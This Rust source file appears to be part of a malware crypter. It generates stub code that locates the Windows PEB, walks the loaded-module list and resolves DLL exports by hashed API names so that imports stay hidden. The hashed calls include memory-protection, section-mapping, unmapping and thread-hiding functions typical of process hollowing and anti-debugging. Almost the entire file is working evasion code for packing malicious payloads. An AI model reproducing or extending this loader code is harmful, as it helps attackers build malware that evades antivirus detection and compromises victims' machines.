use crypter_ir::{Resolver, StubProgram};
use sha2::{Digest, Sha256};

fn hash_fnv1a(s: &[u8]) -> u32 {
    let mut h = 0x811c9dc5u32;
    for &b in s {
        h ^= b as u32;
        h = h.wrapping_mul(0x01000193);
    }
    h
}

fn hash_crc32(s: &[u8]) -> u32 {
    let mut c = 0xffffffffu32;
    for &b in s {
        c ^= b as u32;
        for _ in 0..8 {
            c = if c & 1 != 0 {
                (c >> 1) ^ 0xedb88320
            } else {
                c >> 1
            };
        }
    }
    !c
}

fn hash_djb2(s: &[u8]) -> u32 {
    let mut h = 5381u32;
    for &b in s {
        h = h.wrapping_mul(33).wrapping_add(b as u32);
    }
    h
}

fn hash_sel(r: &Resolver) -> fn(&[u8]) -> u32 {
    match r {
        Resolver::ExportWalkFnv1a | Resolver::PebWalk => hash_fnv1a,
        Resolver::ExportWalkCrc32 => hash_crc32,
        Resolver::ExportWalkDjb2 => hash_djb2,
    }
}

fn hash_utf16_lower<F: Fn(&[u8]) -> u32>(f: F, w: &[u16]) -> u32 {
    let bytes: Vec<u8> = w
        .iter()
        .map(|&c| (c as u8).to_ascii_lowercase())
        .collect();
    f(&bytes)
}

pub fn emit_peb_helpers(prog: &StubProgram) -> String {
    let h = hash_sel(&prog.resolver);

    let h_kernel32 = hash_utf16_lower(h, &to_utf16("kernel32.dll"));
    let h_ntdll = hash_utf16_lower(h, &to_utf16("ntdll.dll"));
    let h_kernelbase = hash_utf16_lower(h, &to_utf16("kernelbase.dll"));

    let h_createfilew = h(b"CreateFileW");
    let h_virtualprotect = h(b"VirtualProtect");
    let h_virtualalloc = h(b"VirtualAlloc");
    let h_virtualfree = h(b"VirtualFree");
    let h_loadlibrarya = h(b"LoadLibraryA");
    let h_getprocaddress = h(b"GetProcAddress");
    let h_ntqueryinfo = h(b"NtQueryInformationProcess");
    let h_ntsetinfo = h(b"NtSetInformationThread");
    let h_ntdelay = h(b"NtDelayExecution");
    let h_createthread = h(b"CreateThread");
    let h_waitfor = h(b"WaitForSingleObject");
    let h_closehandle = h(b"CloseHandle");
    let h_ntunmap = h(b"NtUnmapViewOfSection");
    let h_ntmap = h(b"NtMapViewOfSection");
    let h_ntcreate_sec = h(b"NtCreateSection");

    let mut s = String::new();

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("unsafe fn peb_ptr() -> *const u8 {\n");
    s.push_str("    let p: *const u8;\n");
    s.push_str("    core::arch::asm!(\"mov {}, gs:[0x60]\", out(reg) p);\n");
    s.push_str("    p\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("unsafe fn ldr_ptr() -> *const u8 {\n");
    s.push_str("    let peb = peb_ptr();\n");
    s.push_str("    if peb.is_null() { return ptr::null(); }\n");
    s.push_str("    *((peb.add(0x18)) as *const *const u8)\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("unsafe fn in_mem_list_head() -> *const u8 {\n");
    s.push_str("    let l = ldr_ptr();\n");
    s.push_str("    if l.is_null() { return ptr::null(); }\n");
    s.push_str("    l.add(0x20)\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("unsafe fn list_entry_to_ldr(entry: *const u8) -> *const u8 {\n");
    s.push_str("    entry.sub(0x10)\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("unsafe fn ldr_base_dll(e: *const u8) -> *mut c_void {\n");
    s.push_str("    *((e.add(0x30)) as *const *mut c_void)\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("unsafe fn ldr_name(e: *const u8) -> (*const u16, u16) {\n");
    s.push_str("    let len = *((e.add(0x58)) as *const u16);\n");
    s.push_str("    let buf = *((e.add(0x60)) as *const *const u16);\n");
    s.push_str("    (buf, len / 2)\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str(&format!(
        "fn hash_name_utf16(w: &[u16]) -> u32 {{ let mut h = 0x811c9dc5u32; for &c in w {{ h ^= (c as u8).to_ascii_lowercase() as u32; h = h.wrapping_mul(0x01000193); }} h }}\n"
    ));
    s.push_str(&format!(
        "fn hash_bytes(b: &[u8]) -> u32 {{ let mut h = 0x811c9dc5u32; for &x in b {{ h ^= x as u32; h = h.wrapping_mul(0x01000193); }} h }}\n"
    ));
    s.push_str("\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("unsafe fn find_module_hashed(name_hash: u32) -> *mut c_void {\n");
    s.push_str("    let head = in_mem_list_head();\n");
    s.push_str("    if head.is_null() { return ptr::null_mut(); }\n");
    s.push_str("    let mut cur = *((head as *const *const u8));\n");
    s.push_str("    let mut guard = 0u32;\n");
    s.push_str("    while cur != head && guard < 512 {\n");
    s.push_str("        guard += 1;\n");
    s.push_str("        let e = list_entry_to_ldr(cur);\n");
    s.push_str("        let (np, nl) = ldr_name(e);\n");
    s.push_str("        if !np.is_null() && nl > 0 {\n");
    s.push_str("            let slice = std::slice::from_raw_parts(np, nl as usize);\n");
    s.push_str("            if hash_name_utf16(slice) == name_hash { return ldr_base_dll(e); }\n");
    s.push_str("        }\n");
    s.push_str("        cur = *((cur as *const *const u8));\n");
    s.push_str("    }\n");
    s.push_str("    ptr::null_mut()\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("unsafe fn resolve_export_hashed(module: *mut c_void, fn_hash: u32) -> *const u8 {\n");
    s.push_str("    if module.is_null() { return ptr::null(); }\n");
    s.push_str("    let base = module as *const u8;\n");
    s.push_str("    let e_lfanew = *((base.add(0x3C)) as *const u32) as usize;\n");
    s.push_str("    let nt = base.add(e_lfanew);\n");
    s.push_str("    if *((nt) as *const u32) != 0x00004550 { return ptr::null(); }\n");
    s.push_str("    let opt = nt.add(0x18);\n");
    s.push_str("    let magic = *((opt) as *const u16);\n");
    s.push_str("    let is_64 = magic == 0x20b;\n");
    s.push_str("    let dd_off = if is_64 { 0x70 } else { 0x60 };\n");
    s.push_str("    let export_rva = *((opt.add(dd_off)) as *const u32) as usize;\n");
    s.push_str("    if export_rva == 0 { return ptr::null(); }\n");
    s.push_str("    let export_dir = base.add(export_rva);\n");
    s.push_str("    let num_names = *((export_dir.add(0x18)) as *const u32) as usize;\n");
    s.push_str("    let addr_funcs_rva = *((export_dir.add(0x1C)) as *const u32) as usize;\n");
    s.push_str("    let addr_names_rva = *((export_dir.add(0x20)) as *const u32) as usize;\n");
    s.push_str("    let addr_ord_rva = *((export_dir.add(0x24)) as *const u32) as usize;\n");
    s.push_str("    let names = base.add(addr_names_rva) as *const u32;\n");
    s.push_str("    let funcs = base.add(addr_funcs_rva) as *const u32;\n");
    s.push_str("    let ords = base.add(addr_ord_rva) as *const u16;\n");
    s.push_str("    for i in 0..num_names {\n");
    s.push_str("        let name_rva = *names.add(i) as usize;\n");
    s.push_str("        let name_ptr = base.add(name_rva);\n");
    s.push_str("        let mut len = 0usize;\n");
    s.push_str("        while len < 256 && *name_ptr.add(len) != 0 { len += 1; }\n");
    s.push_str("        let ns = std::slice::from_raw_parts(name_ptr, len);\n");
    s.push_str("        if hash_bytes(ns) == fn_hash {\n");
    s.push_str("            let ord = *ords.add(i) as usize;\n");
    s.push_str("            let func_rva = *funcs.add(ord) as usize;\n");
    s.push_str("            return base.add(func_rva);\n");
    s.push_str("        }\n");
    s.push_str("    }\n");
    s.push_str("    ptr::null()\n");
    s.push_str("}\n\n");

    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_KERNEL32: u32 = {:#010x};\n",
        h_kernel32
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_NTDLL: u32 = {:#010x};\n",
        h_ntdll
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_KERNELBASE: u32 = {:#010x};\n",
        h_kernelbase
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_CREATEFILEW: u32 = {:#010x};\n",
        h_createfilew
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_VIRTUALPROTECT: u32 = {:#010x};\n",
        h_virtualprotect
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_VIRTUALALLOC: u32 = {:#010x};\n",
        h_virtualalloc
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_VIRTUALFREE: u32 = {:#010x};\n",
        h_virtualfree
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_LOADLIBRARYA: u32 = {:#010x};\n",
        h_loadlibrarya
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_GETPROCADDRESS: u32 = {:#010x};\n",
        h_getprocaddress
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_NTQUERYINFO: u32 = {:#010x};\n",
        h_ntqueryinfo
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_NTSETINFO: u32 = {:#010x};\n",
        h_ntsetinfo
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_NTDELAY: u32 = {:#010x};\n",
        h_ntdelay
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_CREATETHREAD: u32 = {:#010x};\n",
        h_createthread
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_WAITFORSINGLE: u32 = {:#010x};\n",
        h_waitfor
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_CLOSEHANDLE: u32 = {:#010x};\n",
        h_closehandle
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_NTUNMAP: u32 = {:#010x};\n",
        h_ntunmap
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_NTMAP: u32 = {:#010x};\n",
        h_ntmap
    ));
    s.push_str(&format!(
        "#[cfg(target_os = \"windows\")]\nconst H_NTCREATESEC: u32 = {:#010x};\n",
        h_ntcreate_sec
    ));
    s.push_str("\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("unsafe fn get_kernel32() -> *mut c_void {\n");
    s.push_str("    let k = find_module_hashed(H_KERNEL32);\n");
    s.push_str("    if !k.is_null() { return k; }\n");
    s.push_str("    find_module_hashed(H_KERNELBASE)\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("unsafe fn get_ntdll() -> *mut c_void {\n");
    s.push_str("    find_module_hashed(H_NTDLL)\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("unsafe fn get_proc(h: *mut c_void, name_hash: u32) -> *const u8 {\n");
    s.push_str("    resolve_export_hashed(h, name_hash)\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("unsafe fn load_lib_hash(name_hash: u32) -> *mut c_void {\n");
    s.push_str("    let existing = find_module_hashed(name_hash);\n");
    s.push_str("    if !existing.is_null() { return existing; }\n");
    s.push_str("    ptr::null_mut()\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(target_os = \"windows\")]\n");
    s.push_str("unsafe fn current_process() -> *mut c_void {\n");
    s.push_str("    (-1isize) as *mut c_void\n");
    s.push_str("}\n\n");

    s.push_str("#[cfg(not(target_os = \"windows\"))]\n");
    s.push_str("unsafe fn current_process() -> *mut c_void { ptr::null_mut() }\n\n");

    let _ = Sha256::new();
    s
}

fn to_utf16(s: &str) -> Vec<u16> {
    s.encode_utf16().collect()
}
